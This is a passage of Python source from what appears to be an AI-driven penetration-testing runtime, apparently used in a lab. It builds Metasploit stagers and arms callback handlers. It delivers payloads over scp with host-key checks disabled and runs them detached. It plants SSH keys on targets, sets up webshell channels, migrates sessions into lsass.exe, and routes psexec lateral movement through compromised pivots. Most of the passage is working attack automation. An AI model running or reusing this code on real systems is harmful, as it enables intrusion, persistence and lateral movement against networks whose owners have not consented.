    # `deployment.request_dispatch.deliver_to_reference` (framing, receipt, error taxonomy).

    def _entry_kind(self, binding) -> str:
        return "remote_command" if binding.via == "kali" else "authorized_connection"

    def action_executor(self, *, state, transports):
        binding = ExecutionBinding.model_validate(state["context"]["execution"])
        declared_hosts = state["context"].get("hosts") or {}

        def address_of(name):
            """Resolve the graph's logical host to the address the network uses.

            A card names the host the way the graph does ("dc"); the peer service and the
            produced-session check work on addresses. Passing "dc" to the module made the
            session look like it belonged to another host, so the hand-over timed out with
            the session already open (live 2026-10-18, node 44).
            """
            entry = declared_hosts.get(str(name)) or {}
            addresses = [str(value) for value in (entry.get("ips") or []) if str(value).strip()]
            return addresses[0] if addresses else str(name)

        def invoke(request):
            # One delivery path for every stage: the four fields decide where and what runs.
            from deployment.request_dispatch import DEFAULT_END_MARKER, deliver

            # A request may arrive in the newer {tool,target,arguments} shape (cards and the
            # Action schema use it). Normalize here as the last entry point, so the
            # control-plane decision below is made on one shape only.
            try:
                from src.tools.adapt import to_legacy_request
                request = to_legacy_request(request)
            except Exception:
                pass
            structured = isinstance(request, dict) and request.get("tool") in {"msf", "control"}
            options = getattr(self, "options", None)

            def control_action(name, arguments):
                if name == "remote_process":
                    return self.control_remote_process(
                        binding, address_of(arguments.get("host", "")),
                        arguments.get("command", ""),
                        arguments.get("credential_ref", ""),
                        arguments.get("method", "wmic"),
                        arguments.get("local_path", ""),
                        arguments.get("remote_path", ""),
                        "action:" + str(state["context"]["node"]["id"]))
                if name == "credential_test":
                    return self.test_credential(
                        host=arguments.get("host", ""),
                        credential_ref=arguments.get("credential_ref", ""),
                        method=arguments.get("method", "smb"),
                        port=arguments.get("port"),
                        timeout=arguments.get("timeout", 60))
                return None

            return deliver(binding, request, backend=getattr(self, "backend", None),
                           transports=transports,
                           end_marker=getattr(options, "end_marker", DEFAULT_END_MARKER),
                           timeout=getattr(options, "command_timeout", 60.0),
                           # The control box is this runtime's own side, not the node's face.
                           control_binding=self._receiver_binding() if structured
                           and request.get("tool") == "control" else None,
                           control=control_action
                           if structured and request.get("tool") == "control" else None)

        def export_carrier(observation):
            # Called only after the command receipt and assessment are committed.
            # This callback resolves an existing owner-held channel; it must not
            # dispatch, establish a channel, or infer one from command output.
            facts = [child for child in state["context"]["children"]
                     if str(child.get("description") or "").startswith("execCode(")]
            if not facts:
                return None
            if len(facts) > 1:
                exports = {}
                plans = state["context"].get("delivery_plans") or {}
                for fact in facts:
                    child_state = deepcopy(state)
                    child_state["context"]["children"] = [deepcopy(fact)]
                    child_state["context"].pop("delivery_plan", None)
                    if str(fact["id"]) in plans:
                        child_state["context"]["delivery_plan"] = plans[str(fact["id"])]
                    exports[str(fact["id"])] = self.action_executor(
                        state=child_state, transports=transports).export_carrier(observation)
                return exports
            delivery = state["context"].get("delivery_plan")
            parameters = _parameters(facts[0]["description"])
            produced = self._produced_sessions.pop(
                "action:" + str(state["context"]["node"]["id"]), None)
            if produced is not None:
                # A control-plane remote execution opened this attempt's channel. Hand the
                # existing session over as-is; this callback never dispatches anything.
                reference = SessionReference.model_validate(produced["reference"])
                carrier = {"ref": "carrier:" + reference.session_id + ":" + reference.instance_id,
                           "kind": "msf" if produced["type"] in {"shell", "meterpreter"} else "unknown",
                           "owner": "console", "handle": reference.session_id,
                           "target_host": parameters["host"],
                           # The target name is what the run registers; the address the
                           # console actually reported is what a liveness check compares
                           # against. A tunnel session reports the forwarded endpoint here,
                           # and that endpoint is the fact, not a second target.
                           "address": str(produced.get("observed_address") or produced["host"]),
                           "source_node_id": str(state["context"]["node"]["id"]),
                           "source_attempt_id": str(state["run"]["id"]),
                           "generation": str(reference.generation),
                           "platform": produced["platform"], "lifecycle": "available"}
                return CarrierExport.model_validate({
                    "carrier": carrier, "privilege": parameters["user"],
                    "channel": {"kind": "unified",
                                "reference": reference.model_dump()}}).model_dump()
            reference = binding.session
            provider_name = str(getattr(binding, "provider", None) or "msf")
            hosts = (state["context"].get("hosts") or {}).get(parameters["host"]) or {}
            addresses = list(dict.fromkeys(
                str(value) for value in (hosts.get("ips") or []) if str(value).strip()))
            target_platform = str(hosts.get("platform") or binding.platform)
            setup = next((skill.get("entry_setup") for skill in state.get("skills", [])
                          if isinstance(skill, dict) and skill.get("entry_setup")), None)
            # The workflow calls this callback only after `action_complete=true`; the
            # closure's `state` is the bind-time state, so its `current` is not a gate.
            if provider_name in {"msf", "kali"} and setup:
                # The card declares how this attempt's own channel is authorized. The
                # runtime installs the key / builds the endpoint now, at the Action -> Post
                # boundary, instead of asking the model to handle credentials.
                if delivery:
                    # A prepared stager/handler is not this attempt's hand-over; release it
                    # instead of leaving an unused listener armed.
                    try:
                        self.stop_action_delivery(delivery)
                    except Exception:
                        pass
                channel = self._entry_setup_channel(
                    binding, setup, parameters, addresses, target_platform, transports,
                    node=state["context"]["node"])
                reference = SessionReference.model_validate(channel["reference"])
                carrier = {"ref": "carrier:" + reference.session_id + ":" + reference.instance_id,
                           "kind": "ssh" if channel["provider"] == "ssh" else "web",
                           "owner": channel["provider"], "handle": reference.session_id,
                           "target_host": parameters["host"],
                           "address": addresses[0] if addresses else parameters["host"],
                           "source_node_id": str(state["context"]["node"]["id"]),
                           "source_attempt_id": str(state["run"]["id"]),
                           "generation": str(reference.generation),
                           "platform": target_platform, "lifecycle": "available"}
                return CarrierExport.model_validate({
                    "carrier": carrier, "privilege": parameters["user"],
                    "channel": channel}).model_dump()
            if delivery:
                # This attempt ran the runtime's hand-over; claim the session it produced.
                return self.claim_delivered_carrier(delivery,
                    node_id=state["context"]["node"]["id"], attempt_id=state["run"]["id"])
            if binding.binding_kind == "controller_entry":
                raise PipelineFailure("会话没接上", "action_carrier_channel_unavailable")
            if provider_name == "msf":
                metadata = self.backend.get_session(reference.session_id,
                                                    instance_id=reference.instance_id)
                observed_host = metadata.host
                observed_platform = metadata.platform
                kind = "msf" if metadata.type in {"shell", "meterpreter"} else "unknown"
                owner = "console"
                channel = {"kind": "unified", "reference": reference.model_dump()}
            else:
                metadata = None
                observed_host = addresses[0] if addresses else parameters["host"]
                observed_platform = target_platform
                kind = "web" if provider_name == "webshell" else provider_name
                owner = provider_name
                channel = self._provider_channel(binding, parameters, addresses, target_platform)
            # An existing carrier must name the execCode target. A channel produced by this
            # attempt (a new ssh/webshell on the child's host) is allowed to differ from the
            # source binding; Post is the gate that proves it actually works.
            produced = provider_name != "msf" and str(getattr(binding, "provider", "") or "") != provider_name
            if not produced and (
                    observed_host not in {parameters["host"], *binding.addresses}
                    or binding.host != parameters["host"]
                    or binding.identity != parameters["user"]):
                raise PipelineFailure("会话没接上", "action_carrier_channel_unavailable")
            carrier = {"ref": "carrier:" + reference.session_id + ":" + reference.instance_id,
                       "kind": kind,
                       "owner": owner, "handle": reference.session_id,
                       "target_host": parameters["host"],
                       "address": str(observed_host),
                       "source_node_id": str(state["context"]["node"]["id"]),
                       "source_attempt_id": str(state["run"]["id"]),
                       "generation": str(reference.generation),
                       "platform": str(observed_platform),
                       "lifecycle": "available"}
            return CarrierExport.model_validate({"carrier": carrier, "privilege": parameters["user"],
                "channel": channel}).model_dump()

        invoke.export_carrier = export_carrier
        return invoke

    def _entry_setup_channel(self, binding, setup, parameters, addresses, platform, transports,
                             *, node=None):
        """Authorize and describe the channel a card declares it produces.

        SSH: the run key is installed by the card-declared command, executed by the
        runtime on the Action's own binding. WebShell: the card declares the endpoint
        template. Both hand Post a frozen binding, never a model-held secret.
        """
        from secrets import token_hex
        provider = str(setup.get("provider") or "ssh")
        username = str(setup.get("username") or parameters["user"] or "root")
        marker = "agv-entry-" + token_hex(8)
        if provider == "ssh":
            key_path = str((self.options.delivery or {}).get("key_path") or "")
            if not key_path:
                raise PipelineFailure("参数没给到", "action_entry_setup_key_missing")
            template = str(setup.get("authorize_command") or "")
            if not template:
                raise PipelineFailure("参数没给到", "action_entry_setup_authorize_missing")
            self.ensure_delivery_key(key_path)
            public = self._read_control_file(key_path + ".pub").strip()
            if not public:
                raise PipelineFailure("参数没给到", "action_entry_setup_public_key_missing")
            command = fill_template(template, {
                "public_key": public, "public_key_file": key_path + ".pub",
                "key_path": key_path, "target_host": parameters["host"],
                "target_address": addresses[0] if addresses else parameters["host"],
                "target_port": str((node or {}).get("port") or ""),
                "username": username, "marker": marker})
            from deployment.request_dispatch import deliver
            target = "kali" if binding.binding_kind == "controller_entry" else "session"
            receipt = deliver(binding, {"tool": "run_command", "target": target,
                                        "arguments": {"interpreter": "sh", "command": command}},
                              backend=self.backend, transports=transports,
                              end_marker=self.options.end_marker,
                              timeout=self.options.command_timeout)
            if receipt.get("effect_known") is not True:
                raise PipelineFailure("会话没接上", "action_entry_setup_unconfirmed")
            text = self._stdout_text(receipt.get("response"))
            if marker not in text:
                raise PipelineFailure("会话没接上", "action_entry_setup_unconfirmed")
            values = {"provider": "ssh", "ssh_key_path": key_path,
                      "ssh_port": int(setup.get("port") or 22)}
            prefix, seed_extra = "ssh", key_path
        elif provider == "webshell":
            template = str(setup.get("url_template") or "")
            if not template:
                raise PipelineFailure("参数没给到", "action_entry_setup_url_missing")
            url = template.format(target_host=parameters["host"], username=username,
                                  marker=marker)
            values = {"provider": "webshell", "webshell_url": url,
                      "webshell_parameter": str(setup.get("parameter") or "cmd")}
            prefix, seed_extra = "web", url
        else:
            raise PipelineFailure("参数没给到", "action_entry_setup_provider_unknown")
        from hashlib import sha256
        seed = "|".join((provider, parameters["host"], username, seed_extra))
        reference = SessionReference(
            session_id=prefix + ":" + parameters["host"] + ":" + username,
            instance_id=sha256(seed.encode()).hexdigest()[:16], generation=1)
        carrier_binding = {
            "session": reference.model_dump(), "via": "session",
            "host": parameters["host"], "addresses": addresses,
            "identity": username, "platform": platform,
            "binding_kind": "console_session", **values,
        }
        return {"kind": "remote_command", "owner": provider,
                "handle": reference.session_id, "reference": reference.model_dump(),
                "provider": provider, "binding": carrier_binding}

    def _provider_channel(self, binding, parameters, addresses, platform):
        """Describe a non-console carrier with the frozen binding its consumer needs.

        A channel is exported only when the owner can actually resolve it later. For an
        SSH carrier that means the run key; for a WebShell it means a concrete endpoint.
        A missing configuration is a named refusal, never a fabricated unified channel.
        """
        provider = str(getattr(binding, "provider", None) or "msf")
        key_path = str(getattr(binding, "ssh_key_path", None)
                       or (self.options.delivery or {}).get("key_path") or "")
        url = str(getattr(binding, "webshell_url", None) or "")
        if provider == "ssh":
            if not key_path:
                raise PipelineFailure("参数没给到", "action_carrier_ssh_key_missing")
            carrier_reference = self._carrier_reference(
                binding, provider, parameters, seed_extra=key_path)
            values = {"provider": "ssh", "ssh_key_path": key_path,
                      "ssh_port": int(getattr(binding, "ssh_port", None) or 22)}
        elif provider == "webshell":
            if not url:
                raise PipelineFailure("参数没给到", "action_carrier_webshell_url_missing")
            carrier_reference = self._carrier_reference(
                binding, provider, parameters, seed_extra=url)
            values = {"provider": "webshell", "webshell_url": url,
                      "webshell_parameter": str(
                          getattr(binding, "webshell_parameter", None) or "cmd")}
        else:
            raise PipelineFailure("会话没接上", "action_carrier_provider_unknown")
        carrier_binding = {
            "session": carrier_reference.model_dump(),
            "via": "session",
            "host": parameters["host"],
            "addresses": addresses,
            "identity": parameters["user"],
            "platform": platform,
            "binding_kind": "console_session",
            **values,
        }
        return {"kind": "remote_command", "owner": provider,
                "handle": carrier_reference.session_id,
                "reference": carrier_reference.model_dump(),
                "provider": provider, "binding": carrier_binding}

    @staticmethod
    def _carrier_reference(binding, provider, parameters, *, seed_extra):
        """Keep a source carrier's pinned reference; otherwise mint one for this target."""
        if (str(getattr(binding, "provider", "") or "") == provider
                and binding.host == parameters["host"]
                and binding.identity == parameters["user"]):
            return binding.session
        from hashlib import sha256
        seed = "|".join((provider, parameters["host"], parameters["user"], seed_extra))
        prefix = "ssh" if provider == "ssh" else "web"
        return SessionReference(
            session_id=prefix + ":" + parameters["host"] + ":" + parameters["user"],
            instance_id=sha256(seed.encode()).hexdigest()[:16], generation=1)

    def post_gateway(self, *, state, transports):
        context = state["context"]
        reference = context.get("current_carrier_ref")
        inventory = context.get("carrier_inventory", {})
        # Preserve Post.prepare's evidence-review / missing-carrier judgments.
        # A constructor must not dispatch or require a live channel for recovery.
        if (context.get("evidence_policy", {}).get("mode") == "evidence_review"
                or context.get("requires_carrier") and not reference
                or reference and (reference not in inventory
                    or inventory[reference]["target_host"] != context["target_host"])):
            return ConsolePostGateway(self, None, self.root, context=context)
        if context["proposition"] == "channel_liveness":
            if not reference:
                return ConsolePostGateway(self, None, self.root, context=context)
            if context.get("carrier_export") is None:
                raise PipelineFailure("会话没接上", "post_carrier_channel_unavailable")
            exported = freeze_carrier_export(context["carrier_export"], reference=reference,
                inventory=inventory, target=context["target_host"],
                node_id=context["carrier_export"]["carrier"]["source_node_id"],
                attempt_id=context["carrier_export"]["carrier"]["source_attempt_id"])
            carrier, channel = exported["carrier"], exported["channel"]
            if channel["kind"] != "unified":
                # A provider-owned channel (ssh/webshell) is observed through the same
                # gateway: the export carries the frozen binding the provider dispatch
                # needs, so there is no second transport to resolve here.
                if exported.get("reference") is None:
                    raise PipelineFailure("会话没接上", "post_carrier_channel_unavailable")
                return ConsolePostGateway(self, None, self.root, context=deepcopy(context),
                                          carrier=exported)
            # This owner can pin a unified reference. An alias alone cannot prove
            # the original instance; never resolve it to today's same-name session.
            if (carrier["owner"] != "console" or carrier["lifecycle"] != "available"
                    or channel["kind"] != "unified"
                    or carrier["handle"] != channel["reference"]["session_id"]
                    or carrier["generation"] != str(channel["reference"]["generation"])):
                raise PipelineFailure("会话没接上", "post_carrier_channel_unavailable")
            return ConsolePostGateway(self, None, self.root, context=context, carrier=exported)
        if "execution" not in context:
            raise PipelineFailure("参数没给到", "post_execution_binding_missing")
        binding = ExecutionBinding.model_validate(freeze_execution(context["execution"]))
        return ConsolePostGateway(self, binding, self.root, context=context)

    # --- delivery ---------------------------------------------------------
    def _migration_path(self, run_id, operation_id):
        from hashlib import sha256
        key = sha256(json.dumps([run_id, operation_id]).encode()).hexdigest()
        return self.root / ("migration-" + key + ".json")

    def lookup_migration(self, *, run_id, operation_id):
        """Reconcile an existing operation using its reserved endpoint and incarnations."""
        path = self._migration_path(run_id, operation_id)
        if not path.exists():
            return []
        saved = json.loads(path.read_text(encoding="utf-8"))
        if saved.get("receipts"):
            return saved["receipts"]
        payload = CallbackPayload.model_validate(saved["payload"])
        if (payload.run_id, payload.operation_id) != (run_id, operation_id):
            raise ValueError("Migration operation changed")
        receipts = []
        for sid, metadata in sorted(self.backend.list_sessions().items()):
            endpoint = str(getattr(metadata, "callback_endpoint", None) or "")
            # The callback port is reserved for this one operation, so it is the binding
            # discriminator. The host check only applies when the payload carries the host's
            # addresses: the console reports `192.168.52.10` while the graph says `web1`, and
            # comparing them excluded the very session this operation produced (live
            # 2026-10-18, node 12 closeout: session 18 existed, the receipt list stayed empty).
            accepted = {payload.host, *payload.target_addresses}
            if (endpoint.rsplit(":", 1)[-1] != str(payload.callback_port)
                    or (payload.target_addresses and metadata.host not in accepted)
                    or [sid, metadata.instance_id] in saved["baseline"]):
                continue
            receipt = CallbackReceipt(run_id=run_id, operation_id=operation_id,
                host=payload.host, privilege=payload.privilege,
                operation_generation=payload.operation_generation,
                reference=self.backend.reference_for(sid))
            receipts.append(receipt.model_dump(mode="json"))
        if receipts:
            _write_json(path, {**saved, "receipts": receipts})
        return receipts

    def artifact_url_for(self, payload: CallbackPayload) -> str:
        """Resolve the fetch address against this migration's reserved endpoint.

        The receiver's port is allocated per migration, so an address that names the
        reserved port must be expanded before it reaches the launch command.
        """
        return self.options.artifact_url.format(port=payload.callback_port,
                                                fetch_port=self.options.fetch_port,
                                                callback_host=payload.callback_host)

    # --- Action hand-over -------------------------------------------------
    def _read_control_file(self, path):
        binding = self._receiver_binding()
        result = self.transports.execute(binding, ExecutionRequest(
            tool="code", name="bash", via=binding["via"],
            content="cat " + shlex.quote(str(path))))
        if result.get("effect_known") is not True:
            raise PipelineFailure("会话没接上", "owner_delivery_key_unreadable")
        return ExecutionSessionOwner._stdout_text(result.get("response"))

    def delivery_shape(self, card_name=""):
        """Load the selected Action card's own hand-over recipe.

        The card is the single artifact: retrieval chooses it, the model reads its body,
        and the runtime reads its ``entry_setup``. There is deliberately no table that
        maps a service name to a card, because such a table drifts from the registry and
        turns a new method into a deployment-code change.
        """
        name = str(card_name or "").strip()
        if not name:
            raise PipelineFailure("参数没给到", "owner_delivery_card_missing")
        spec = load_delivery_card(name)
        if spec.transport != "scp":
            raise PipelineFailure("参数没给到", "owner_delivery_transport_unimplemented")
        return spec

    @staticmethod
    def scp_delivery_command(*, key_path, stager_path, username, host, port, remote_path):
        """Copy and chmod synchronously; detach only the payload process."""
        q = shlex.quote
        options = ("-o IdentitiesOnly=yes -o StrictHostKeyChecking=no "
                   "-o UserKnownHostsFile=/dev/null -o BatchMode=yes")
        destination = username + "@" + host
        remote = ("chmod +x " + q(remote_path) + " && (setsid " + q(remote_path)
                  + " >/dev/null 2>&1 </dev/null &) && echo agv-payload-started")
        return (f"scp -i {q(key_path)} {options} -P {port} {q(stager_path)} "
                f"{q(destination + ':' + remote_path)} && ssh -i {q(key_path)} "
                f"{options} -p {port} {q(destination)} {q(remote)}")

    def action_delivery_inputs(self, payload: CallbackPayload, *, target_port="", card_name="",
                               address=""):
        """Bind the card's authorization template and build the transport in code."""
        spec = self.delivery_shape(card_name)
        template = spec.entry.authorize_command
        delivery = self.options.delivery or {}
        key_path = str(delivery.get("key_path") or "").strip()
        stager_path = str(delivery.get("stager_path") or "").strip()
        if not key_path:
            raise PipelineFailure("参数没给到", "owner_delivery_key_missing")
        if not stager_path:
            raise PipelineFailure("参数没给到", "owner_stager_path_required")
        values = {"target_host": address or payload.host, "target_name": payload.host,
                  "target_port": str(target_port), "username": spec.entry.username,
                  "handler_port": str(payload.callback_port),
                  "callback_host": payload.callback_host, "operation_id": payload.operation_id,
                  "artifact_url": self.artifact_url_for(payload),
                  "remote_path": self.options.remote_path, "stager_path": stager_path,
                  "key_path": key_path, "public_key_file": key_path + ".pub"}
        if "{public_key}" in template or "{public_key_file}" in template:
            public = self._read_control_file(key_path + ".pub")
            if not public.strip() or "PUBLIC KEY" not in public and "ssh-" not in public:
                raise PipelineFailure("参数没给到", "owner_delivery_key_unreadable")
            values["public_key"] = " ".join(public.split())
        authorize = fill_template(template, values)
        try:
            shlex.split(authorize)
        except ValueError as exc:
            raise PipelineFailure("参数没给到", "owner_delivery_authorize_syntax_invalid") from exc
        command = self.scp_delivery_command(key_path=key_path, stager_path=stager_path,
            username=spec.entry.username, host=values["target_host"], port=spec.entry.port,
            remote_path=self.options.remote_path)
        return {"delivery_authorize_command": authorize, "delivery_command": command,
                "delivery_username": values["username"], "delivery_key_path": key_path,
                "must_deliver_session": DELIVERY_INSTRUCTION}

    def ensure_delivery_key(self, key_path):
        """Create this deployment's hand-over key on the control box if it is missing.

        ed25519 only: modern sshd refuses ssh-rsa signatures by default, so an RSA
        run key would plant a public key the target then rejects.
        """
        if not str(key_path or "").strip():
            return False
        binding = self._receiver_binding()
        command = ("mkdir -p $(dirname {key}) && "
                   "(test -s {key} && test -s {key}.pub && "
                   "head -c 11 {key}.pub | grep -q '^ssh-ed25519' || "
                   "(rm -f {key} {key}.pub; "
                   "ssh-keygen -q -t ed25519 -N '' -f {key} >/dev/null 2>&1)); "
                   "chmod 600 {key}; test -s {key}.pub && echo agv-key-ready").format(
                       key=shlex.quote(str(key_path)))
        result = self.transports.execute(binding, ExecutionRequest(
            tool="code", name="bash", via=binding["via"], content=command))
        text = (ExecutionSessionOwner._stdout_text(result.get("response"))
                if isinstance(result, dict) else "")
        if result.get("effect_known") is not True or "agv-key-ready" not in text:
            raise PipelineFailure("会话没接上", "owner_delivery_key_unavailable")
        return True

    def _payload_name(self, payload: CallbackPayload, *, required=True) -> str:
        """The one payload this run's handler and artifact share.

        Derived from the configured host map, never from a card: a card that names its
        own payload can drift from the handler that receives it (live run
        node-final-20261017-08, node 12: handler armed stageless, stager built staged,
        zero sessions for 120 seconds).
        """
        spec = self.options.handler or {}
        payloads = spec.get("payloads") or {}
        chosen = str(payloads.get(payload.host) or spec.get("payload") or "").strip()
        if not chosen and required:
            raise PipelineFailure("参数没给到", "owner_handler_payload_missing_for_host")
        return chosen

    @staticmethod
    def _artifact_format(payload_name: str) -> str:
        return "exe" if str(payload_name).lower().startswith("windows/") else "elf"

    def _stager_path(self, payload: CallbackPayload, name: str | None = None) -> str:
        """The artifact's execution-point path, named for the platform it targets."""
        base = str((self.options.delivery or {}).get("stager_path") or "").strip()
        directory, _, filename = base.rpartition("/")
        if not directory or not filename:
            raise PipelineFailure("参数没给到", "owner_stager_path_required")
        chosen = name if name is not None else self._payload_name(payload, required=False)
        suffix = ".exe" if self._artifact_format(chosen) == "exe" else ".bin"
        stem = filename.rsplit(".", 1)[0] or "agv_stager"
        return directory + "/" + stem + suffix

    def build_artifact(self, payload: CallbackPayload):
        """Build this run's artifact from the same payload name the handler was armed with.

        Building and arming are one runtime step: the card neither names a payload nor opens
        a listener. The configured command is idempotent and runs on the control box.
        """
        command_template = str(self.options.artifact_command or "").strip()
        if not command_template:
            return False
        # The build is only valid when this host has a configured payload: the same name
        # is what the handler was armed with.
        self._payload_name(payload)
        command = command_template.format(**self._fetch_values(payload))
        result = self.transports.execute(self._receiver_binding(), ExecutionRequest(
            tool="code", name="bash", via="kali", content=command))
        # Remember which callback port this artifact embeds: a later migration reserves a new
        # port for its own receiver, and reusing the previous artifact sends the callback to a
        # listener that no longer exists (live 2026-10-18: node 12 closeout, callback_timeout
        # with a stager built for an earlier attempt's port).
        self._artifact_ports[str(self._stager_path(payload))] = int(payload.callback_port)
        if result.get("effect_known") is not True:
            raise PipelineFailure("会话没接上", "owner_artifact_build_unconfirmed")
        return True

    def reserve_action_delivery(self, payload: CallbackPayload, *, target_port="", address=""):
        """Arm the receiver for one Action attempt and freeze the console baseline.

        The baseline is what the later claim compares against: a session that already
        existed before this attempt is never mistaken for the one this attempt produced.
        """
        self.ensure_delivery_key(str((self.options.delivery or {}).get("key_path") or ""))
        baseline = sorted(self.backend.list_sessions())
        self.run_receiver(payload)
        self._action_payloads[payload.operation_id] = payload
        return {"operation_id": payload.operation_id, "host": payload.host,
                "address": str(address or ""),
                "privilege": payload.privilege, "callback_host": payload.callback_host,
                "callback_port": payload.callback_port, "target_port": str(target_port),
                "baseline": baseline}

    def prepare_action_delivery(self, payload: CallbackPayload, *, target_port="",
                                address="", container_owned=False):
        """Build the artifact and arm the handler as one step, then freeze the baseline.

        This is the only place a listener is opened for an Action. The payload name and the
        port come from this one call, so the stager and the handler cannot disagree. The
        card only receives the resulting values (artifact path, callback address, fetch URL)
        and performs the delivery it describes.

        A container target reports the address it calls back from (its bridge address), which
        is not the host address the graph carries; for those the frozen baseline window is
        the only discriminator the runtime has, and the caller declares that explicitly.
        """
        baseline = sorted(self.backend.list_sessions())
        self._action_payloads[payload.operation_id] = payload
        self.ensure_delivery_key(str((self.options.delivery or {}).get("key_path") or ""))
        self.build_artifact(payload)
        job = ""
        if self.options.handler:
            job = self._arm_handler(payload)
            if not job:
                raise PipelineFailure("会话没接上", "owner_handler_not_armed")
            self._handlers[payload.operation_id] = job
        payload_name = self._payload_name(payload)
        stager_path = self._stager_path(payload)
        key_path = str((self.options.delivery or {}).get("key_path") or "")
        # A fixed target path collides with a stager left running by an earlier attempt
        # (scp reports "Text file busy"). The run and node make it unique without the card
        # having to invent a name.
        run_suffix = str(payload.run_id).replace("-", "")[-8:]
        node_suffix = str(payload.operation_id).split(":")[-1]
        if self._artifact_format(payload_name) == "exe":
            remote_path = "C:\\Windows\\Temp\\agv_stager_" + node_suffix + "_" + run_suffix + ".exe"
        else:
            remote_path = "/tmp/agv_stager_" + node_suffix + "_" + run_suffix
        return {"operation_id": payload.operation_id, "host": payload.host,
                "address": str(address or ""), "privilege": payload.privilege,
                "callback_host": payload.callback_host, "callback_port": payload.callback_port,
                "target_port": str(target_port), "baseline": baseline, "card_owned": True,
                "container_owned": bool(container_owned), "job_id": job,
                "payload": payload_name, "format": self._artifact_format(payload_name),
                "stager_path": stager_path, "remote_path": remote_path,
                "key_path": key_path,
                "public_key_path": key_path + ".pub" if key_path else ""}

    #: Older callers name this step after the card; the semantics are unchanged.
    arm_card_owned_delivery = prepare_action_delivery

    def claim_delivered_carrier(self, plan, *, node_id, attempt_id):
        """Claim the session this attempt's hand-over produced, never an older one.

        The callback needs the payload to run and connect back, so the claim waits
        for the configured callback window instead of sampling the console once.
        """
        baseline = set(plan.get("baseline") or [])
        #: The console reports the address; the graph keeps the logical name.
        accepted = {str(plan["host"]), *(str(value) for value in (plan.get("address"),) if value)}
        any_new = bool(plan.get("container_owned"))
        deadline = monotonic() + float(self.options.callback_timeout)
        while True:
            for session_id, metadata in sorted(self.backend.list_sessions().items()):
                if session_id in baseline:
                    continue
                if not any_new and str(metadata.host) not in accepted:
                    continue
                reference = self.backend.reference_for(session_id)
                # Stabilise the channel once, at the single point where a produced session is
                # claimed. A payload launched by a web process, a service or a scheduler is
                # a child of that launcher; when the launcher exits the child goes with it,
                # which is exactly why a freshly claimed session looks alive and then dies
                # (live 2026-10-18: the PC1 channel from the OA chain disappeared before the
                # next node could use it). Moving it into a long-lived process here makes
                # every later stage see the same stable session — not a per-node workaround.
                if str(metadata.platform) == "windows":
                    for target in ("lsass.exe", "explorer.exe"):
                        try:
                            self.backend._meterpreter_single(session_id,
                                                             "migrate -N " + target,
                                                             settle=2.0)
                            self.backend.get_session(session_id)
                            break
                        except Exception:
                            continue
                carrier = {"ref": "carrier:" + reference.session_id + ":" + reference.instance_id,
                          "kind": "msf" if metadata.type in {"shell", "meterpreter"} else "unknown",
                          "owner": "console", "handle": reference.session_id,
                          "target_host": plan["host"], "source_node_id": str(node_id),
                          "address": str(metadata.host),
                          "source_attempt_id": str(attempt_id),
                          "generation": str(reference.generation),
                          "platform": str(getattr(metadata, "platform", "")),
                          "lifecycle": "available"}
                return CarrierExport.model_validate({"carrier": carrier,
                    "privilege": plan["privilege"],
                    "channel": {"kind": "unified",
                                "reference": reference.model_dump()}}).model_dump()
            remaining = deadline - monotonic()
            if remaining <= 0:
                break
            sleep(min(float(self.options.poll_interval), remaining))
        raise PipelineFailure("会话没接上", "action_carrier_channel_unavailable")

    def stop_action_delivery(self, plan):
        """Release the temporary receiver; an accepted session is never closed here."""
        payload = self._action_payloads.pop(plan["operation_id"], None)
        if payload is None:
            raise PipelineFailure("会话没接上", "owner_delivery_reservation_unknown")
        if plan.get("card_owned"):
            # The card ran its own hand-over; only the handler this runtime armed is ours.
            job = self._handlers.pop(plan["operation_id"], "")
            if job:
                self.backend.console(["jobs -k " + job], timeout=self.options.command_timeout)
            return
        self.stop_receiver(payload)

    def bind_credentials(self, store, *, default_ref=""):
        """Attach the deployment's encrypted credential store; no secret reaches a model."""
        self.credentials = store
        self.default_credential_ref = str(default_ref or "")
        return True

    def _ensure_route(self, binding, host, mark=None):
        """Route the target's subnet through the node's own compromised session.

        The graph's path to the second segment is a dual-homed host, not the controller:
        Kali carries an explicit `unreachable 192.168.93.0/24` in this lab, and the SMB
        lateral rule is `hacl(pc1,dc,tcp,445)`. The peer service can carry the module's SMB
        connection *and* the bind handler's connection through that session, which keeps the
        traffic origin where the graph says it is. Adding a controller-side route would
        route around the pivot and change the lab.
        """
        if binding is None or getattr(binding, "binding_kind", "") != "console_session":
            return False
        session_id = str(binding.session.session_id)
        # The pivot must be alive at the moment it is used: a channel that was stable when
        # the node bound can die before the module connects (live 2026-10-18, node 44:
        # session 3 "Died" mid-psexec and the route vanished with it). Fall back to another
        # live session on the same host instead of failing the node.
        try:
            self.backend.get_session(session_id,
                                     instance_id=binding.session.instance_id)
        except Exception:
            addresses = {str(value) for value in (binding.addresses or [])}
            substitute = next((sid for sid, meta in sorted(self.backend.list_sessions().items())
                               if str(meta.host) in addresses | {str(binding.host)}
                               and str(meta.platform) == str(binding.platform)), None)
            if substitute is None:
                raise PipelineFailure("会话没接上", "owner_pivot_session_missing") from None
            session_id = str(substitute)
        subnet = self._pivot_target_network(binding, host)
        def readable(text):
            return subnet.split("/")[0] in text and ("Session " + session_id) in text

        # Budgets here must be short. A console that is still draining a previous step used to
        # make each of these calls eat its full budget; the route step alone then cost 288 s
        # while the actual command took 6.8 s (live 2026-10-19, node 2). The table is re-read
        # on every use, but a slow read is not worth minutes.
        # These are synchronous, fast console commands. Waiting for a text marker makes a
        # busy console burn the whole budget even though the command already answered; an
        # idle read returns as soon as the console has nothing more to print.
        table = self.backend.console(["route print"], timeout=8)
        if mark is not None:
            mark("route_read")
        if not readable(table):
            added = self.backend.console(
                ["route add " + subnet + " " + session_id], timeout=10)
            if mark is not None:
                mark("route_add")
            table = _await_ready(
                lambda: (lambda text: text if readable(text) else "")(
                    self.backend.console(["route print"], timeout=8)),
                timeout=2.0, interval=0.25) or table
            if mark is not None:
                mark("route_confirm")
            # An acknowledged add is the fact; a lost echo is why the table is read again.
            if not readable(table) and "Added route" not in added and "already" not in added:
                raise PipelineFailure("会话没接上", "owner_pivot_route_unavailable")
        self._routes.add(subnet)
        # The psexec module explicitly clears `Proxies` and uses the route itself. Starting
        # a SOCKS endpoint here added about ten seconds per preparation and had no consumer
        # (live 2026-10-19, nodes 2/44/48: `route` phase 10.1 s with `route_add` 0.0 s).
        # A consumer that truly needs SOCKS can call `_ensure_socks_proxy` on its own path.
        return True

    def _pivot_target_network(self, binding, host):
        """The pivot's own interface network for the target's segment.

        Read the address and netmask the pivot reports, instead of assuming a /24 from the
        first three octets. A non-/24, multi-homed or routed deployment then resolves the
        same way the pivot itself does.
        """
        try:
            text = self.backend._meterpreter_single(
